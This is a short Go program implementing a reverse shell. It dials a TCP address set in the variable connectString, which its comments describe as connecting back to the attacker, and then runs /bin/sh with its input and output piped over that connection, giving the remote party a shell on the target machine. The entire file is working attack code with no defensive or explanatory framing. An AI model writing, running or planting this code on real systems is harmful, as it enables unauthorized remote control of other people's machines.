package main

import (
	"net"       // requirement to establish a connection
	"os"        // requirement to call os.Exit()
	"os/exec"   // requirement to execute commands against the target system
)

var connectString string

func main() {
	// Connecting back to the attacker
	// If it fails, we exit the program
	if len(connectString) == 0 {
		os.Exit(1)
	}

	conn, err := net.Dial("tcp", connectString)
	if err != nil {
		os.Exit(1)
	}
	// Creating a /bin/sh process
	cmd := exec.Command("/bin/sh")
	// Connecting stdin and stdout
	// to the opened connection
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	// Run the process
	cmd.Run()
}
